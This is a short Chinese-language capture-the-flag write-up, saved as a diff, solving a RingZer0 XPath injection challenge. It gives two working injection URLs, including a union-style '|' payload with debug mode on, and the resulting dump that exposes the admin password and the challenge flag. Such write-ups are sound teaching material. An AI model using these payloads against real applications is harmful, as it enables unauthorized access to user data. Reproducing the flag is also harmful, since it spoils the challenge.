@@ -1,0 +1,19 @@
+http://ringzer0team.com/challenges/79/?u=jtohep"or "1" ="1&xpath_debug=1
+
+证明可以注入。
+蒙对了。。
+猜测结构为：/*[1]/user[username="$username"]
+
+因为开启了调试模式，可以显示所有，不需要暴力跑。
+所以，使用| 相当于sql注入的union 进行注入
+这里的/*["1"] 相当于选中第一个元素吧。。
+
+http://ringzer0team.com/challenges/79/?u=admin" and count(/*)=1 and "1" ="1"] | /*["1&xpath_debug=1
+
+
+
+DEBUG:
+object(SimpleXMLElement)#53 (2) { ["User"]=> object(SimpleXMLElement)#55 (2) { ["username"]=> string(5) "admin" ["password"]=> string(5) "443l4" } ["Flag"]=> object(SimpleXMLElement)#56 (1) { ["flag"]=> string(29) "FLAG-vV1M6aaN2871hWG36FT4Q4qu" } }
+DEBUG:
+object(SimpleXMLElement)#54 (2) { ["username"]=> string(5) "admin" ["password"]=> string(5) "443l4" }
+User "admin" and count(/*)=1 and "1" ="1"] | /*["1" exists.
